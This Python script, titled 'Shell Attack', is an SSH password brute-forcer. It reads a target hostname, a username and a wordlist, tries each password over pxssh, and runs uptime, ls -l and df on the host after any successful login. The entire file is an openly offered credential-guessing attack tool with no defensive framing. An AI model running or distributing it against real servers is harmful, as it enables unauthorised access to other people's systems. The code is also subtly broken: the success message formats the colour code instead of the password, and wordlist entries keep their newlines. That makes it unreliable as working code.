import getpass
from pexpect import pxssh

intro_text = """ 
                                                                                    
 ,---.  ,--.            ,--.,--.      ,---.    ,--.    ,--.                ,--.     
'   .-' |  ,---.  ,---. |  ||  |     /  O  \ ,-'  '-.,-'  '-. ,--,--. ,---.|  |,-.  
`.  `-. |  .-.  || .-. :|  ||  |    |  .-.  |'-.  .-''-.  .-'' ,-.  || .--'|     /  
.-'    ||  | |  |\   --.|  ||  |    |  | |  |  |  |    |  |  \ '-'  |\ `--.|  \  \  
`-----' `--' `--' `----'`--'`--'    `--' `--'  `--'    `--'   `--`--' `---'`--'`--' 
                                                                                    
"""

credits_text = "copyright Talon Bragg 2018 under the MIT License"

class printcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[36m'
    OKGREEN = '\033[32m'
    WARNING = '\033[93m'
    FAIL = '\033[31m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

correct_password = 0
print (printcolors.OKGREEN + intro_text + printcolors.ENDC)
print("\n" + printcolors.OKBLUE + credits_text + printcolors.ENDC + "\n")
hostname = input(printcolors.OKBLUE + 'hostname: ' + printcolors.ENDC)
username = str(input(printcolors.OKBLUE + 'username: ' + printcolors.ENDC))
wordlist = input(printcolors.OKBLUE + 'wordlist: ' + printcolors.ENDC)
wordlist = open(wordlist, "r")

for password in wordlist:
  try:
    s = pxssh.pxssh()   
    s.login (hostname, username, password)
    s.sendline ('uptime')   # run a command
    s.prompt()             # match the prompt
    print((s.before))
    s.sendline ('ls -l')
    s.prompt()
    print((s.before))
    s.sendline ('df')
    s.prompt()
    print((s.before))
    s.logout()
    print(printcolors.OKGREEN + '[+]Password Found: %' + printcolors.ENDC % password)
    correct_password += 1
  except (pxssh.ExceptionPxssh):
    print(printcolors.FAIL + "[-]Incorrect password: " + printcolors.ENDC + "%s, trying again..." % password)
print(printcolors.OKBLUE + "Correct passwords found: " + printcolors.ENDC + str(correct_password))
